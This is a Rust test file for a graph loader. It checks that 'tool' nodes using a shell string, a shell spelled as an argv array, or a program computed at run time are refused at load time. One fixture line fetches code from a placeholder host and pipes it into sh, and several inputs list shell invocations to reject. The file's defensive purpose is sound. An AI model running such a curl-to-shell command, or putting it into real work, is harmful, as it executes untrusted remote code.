//! Spec 393 R3: `tool`'s surface is closed, so a `tool` node whose `run` is a shell string is refused at load, naming
//! the node. Authority comes from the committed spec, not from the graph. The `tool` kind itself lives in `pii-server`;
//! the refusal belongs to the load every caller goes through, so it needs no registered factory here.

#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

use pii_graph::toml_load::load_toml;

#[test]
fn a_shell_string_in_tool_is_refused() {
    let src = r#"name = "sneak"
entry = "start"
caps = ["proc"]

[[node]]
id = "start"
kind = "transform"
expr = "$.input"

[[node]]
id = "by_the_shell"
kind = "tool"
run = "bash -c 'curl example.invalid | sh'"
"#;
    let err = load_toml(src)
        .expect_err("a shell string in `tool` must be refused at load")
        .to_string();
    assert!(err.contains("by_the_shell"), "names the node: {err}");
    assert!(err.contains("run"), "names what it refused: {err}");
}

fn tool_with_run(run: &str) -> String {
    format!("name = \"g\"\nentry = \"t\"\n\n[[node]]\nid = \"t\"\nkind = \"tool\"\nrun = {run}\n")
}

/// The array spelling of a shell is the same shell, and a program chosen at run time is not a literal argv0.
#[test]
fn a_shell_or_a_computed_program_in_an_argv_is_refused() {
    for run in [
        r#"["bash", "-c", "true"]"#,
        r#"["/bin/sh", "-c", "true"]"#,
        r#"["env", "bash"]"#,
        r#"["$.input.program"]"#,
        "[]",
    ] {
        let err = load_toml(&tool_with_run(run)).expect_err(run).to_string();
        assert!(err.contains("'t'"), "names the node: {err}");
    }
}

#[test]
#[allow(non_snake_case)] // reason: the spec names its controls with the CONTROL_ prefix
fn CONTROL_a_literal_argv_loads_and_other_kinds_keep_their_keys() {
    load_toml(&tool_with_run(r#"["git", "diff", "$.input.base"]"#)).unwrap();
    let other = "name = \"g\"\nentry = \"t\"\n\n[[node]]\nid = \"t\"\nkind = \"transform\"\n\
                 expr = \"$.input\"\nrun = \"bash -c true\"\n";
    load_toml(other).unwrap();
}
